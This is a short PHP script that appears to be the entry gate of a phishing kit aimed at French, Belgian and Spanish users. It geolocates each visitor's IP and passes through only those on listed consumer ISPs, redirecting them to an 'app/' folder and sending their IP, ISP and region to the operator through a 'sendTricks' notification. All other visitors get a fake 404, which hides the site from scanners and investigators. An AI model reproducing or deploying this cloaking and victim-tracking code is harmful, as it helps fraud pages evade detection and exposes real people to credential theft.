<?php
include 'settings.php';
include 'common/monitor.php';
session_start();
function navID()
{
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    $ip = $_SESSION['ip'];
    function navTazar()
    {
        $ip = $_SERVER['REMOTE_ADDR'];
        $ipinfo = file_get_contents("http://ip-api.com/json/$ip"); 
        $ipinfo_json = json_decode($ipinfo, true); 
        return $ipinfo_json;
    }
    $ipinfo_json = navTazar($ip);
    if($ipinfo_json['status'] != 'fail'){
        $org = "{$ipinfo_json['as']}";
        $isps = "{$ipinfo_json['isp']}";
        $rname = "{$ipinfo_json['regionName']}";
        $councode = "{$ipinfo_json['countryCode']}";
    }
    else{
        $org = "Introuvable";
        $isps = "Introuvable";
        $rname = "Introuvable";
        $councode = "Introuvable";
    }
    if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"bbox") || strpos(strtolower($org),"red") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"proxad") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"numericable") || strpos(strtolower($org),"belgacom") || strpos(strtolower($org),"sosh") || strpos(strtolower($org),"poste") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") || strpos(strtolower($org),"base") || strpos(strtolower($org),"lycamobile") || strpos(strtolower($org),"pandora") || strpos(strtolower($org),"viking") || strpos(strtolower($org),"movistar") || strpos(strtolower($org),"vodafone") || strpos(strtolower($org),"yoigo") || strpos(strtolower($org),"telefonica") || strpos($org,"Num\303\251ris") || $ip == "::1") { 
        $link = "location: app/";
        header($link);
        sendTricks("ℹ️ $ip chez 📱 $org 📱 se connecte depuis $rname $councode");
    } 
    else{
        die('HTTP/1.0 404 Not Found'); 
    }
}
navID()
?>